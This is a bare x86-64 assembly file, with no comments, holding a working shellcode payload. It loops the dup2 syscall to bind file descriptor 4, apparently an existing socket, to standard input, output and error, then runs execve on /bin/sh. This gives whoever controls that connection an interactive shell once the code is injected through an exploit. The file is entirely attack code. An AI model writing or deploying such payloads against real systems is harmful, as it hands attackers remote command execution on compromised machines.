[BITS 64]

section .text
global _start
_start:

mov rdi, 4
xor rsi, rsi

dup2:
mov rax, 0x21
syscall
inc rsi

cmp rsi, 3
jnz dup2

lea rdi, [rel binsh]
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall

binsh:
db '/bin/sh', 0
